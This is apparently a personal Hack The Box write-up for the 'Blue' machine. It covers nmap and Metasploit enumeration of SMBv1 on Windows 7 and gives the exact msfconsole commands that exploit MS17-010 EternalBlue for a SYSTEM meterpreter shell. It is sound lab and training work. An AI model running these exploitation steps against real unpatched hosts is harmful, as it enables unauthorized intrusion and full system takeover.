---
machine: htb-blue
platform: HTB
os: Windows
difficulty: Easy
solved: 2026-10-21
time: 0.25
tags:
  - SMB
  - Windows
  - MS17-010
takeaway: "Blue demonstrates why legacy protocol versions like SMBv1 should always be disabled across modern networks. Unauthenticated remote code execution via kernel memory corruption allows an immediate jump to SYSTEM privileges without requiring separate privilege escalation. Enumerating exact service patch levels and verifying SMB signing requirements remains an essential initial step before attempting exploitation."
timeBreakdown:
  - [Whole box (not timed per phase), 15]
related: []
---

## Summary

Blue is an easy-difficulty Windows machine on Hack The Box that highlights the critical risk of unpatched remote services. The box exposes standard Windows networking ports with SMBv1 enabled and message signing not required. By querying the SMB service version, the host reveals itself as Windows 7 Professional Service Pack 1, which is vulnerable to the notorious MS17-010 EternalBlue vulnerability. Exploiting this flaw provides direct code execution in the Windows kernel space, dropping an interactive meterpreter session as NT AUTHORITY\SYSTEM. I finished the entire box in 10 to 15 minutes, from the initial port scan to reading both flags.

## Approach

My assessment focused on methodical host reconnaissance followed by targeted service enumeration against the open ports.

### Enumeration

I began with a standard nmap service scan against the target to identify active listening services:

```text
nmap -sVC -Pn -T3 TARGET

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   Computer name: haris-PC
|   Workgroup: WORKGROUP
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
```

The scan revealed Microsoft RPC on port 135, NetBIOS on port 139, and SMB on port 445, along with several high dynamic RPC ports. The OS discovery script identified the machine as Windows 7 Professional 7601 Service Pack 1 in workgroup mode.

Because SMB was running on port 445, I prioritized investigating [network services](/techniques/network-services/) to determine the exact protocol capabilities. I launched Metasploit and used the SMB version scanner auxiliary module to probe the service:

```text
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(scanner/smb/smb_version) > set rhosts TARGET
msf auxiliary(scanner/smb/smb_version) > run
[*] TARGET:445 - SMB Detected (versions: 1, 2) (preferred dialect: SMB 2.1)
[+] TARGET:445 - Host is running Windows 7 Professional SP1 (build: 7601)
[*] TARGET:445 - SMB signing is not required
```

The output confirmed two critical findings: the host accepted SMBv1 connections and did not require packet signing. These conditions strongly suggested that [SMB](/techniques/smb/) vulnerabilities from early 2017 were likely viable against this unpatched build.

### Exploitation

Searching for CVE-2017-0144 identified the `exploit/windows/smb/ms17_010_eternalblue` module. This exploit takes advantage of a buffer overflow in how Srv.sys handles specially crafted SMB requests, corrupting kernel pool memory to achieve unauthenticated remote code execution. Because execution occurs directly at the kernel level, this bypasses the need for traditional [Windows privilege escalation](/techniques/windows-privesc/) techniques.

After checking module options, I configured `RHOSTS` with the target address. I initially attempted setting `LPORT` to the VPN interface name, but after correcting the parameter to port 4444 and assigning `LHOST` to `tun0`, the exploit executed cleanly. Within a minute, the payload completed memory grooming and delivered a meterpreter shell operating with highest-level system integrity.

```text
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts TARGET
msf exploit(windows/smb/ms17_010_eternalblue) > set lport 4444
msf exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0
msf exploit(windows/smb/ms17_010_eternalblue) > run
```

With administrative control established, retrieving the loot was straightforward. The user flag was retrieved from the desktop directory of the standard user profile (`C:\Users\haris\Desktop\user.txt`), and the administrative flag was retrieved directly from `C:\Users\Administrator\Desktop\root.txt`.

```text
C:\Users\haris\Desktop> type user.txt
[redacted]

C:\Users\Administrator\Desktop> type root.txt
[redacted]
```

## Key steps

1. Ran an initial port and service scan with nmap, detecting RPC and SMB listening on standard ports.
2. Verified the SMB service dialect and version using `auxiliary/scanner/smb/smb_version`, confirming Windows 7 SP1 with SMBv1 enabled.
3. Configured and ran the MS17-010 EternalBlue exploit module in Metasploit, establishing an NT AUTHORITY\SYSTEM session.
4. Collected user and root flags from their respective user desktop directories.

## What I would do differently

Next time, instead of opening Metasploit just to check the SMB version and search for modules, I would run Nmap directly with the `--script smb-vuln-ms17-010` vulnerability script against port 445 to confirm the EternalBlue flaw right from the initial scan.
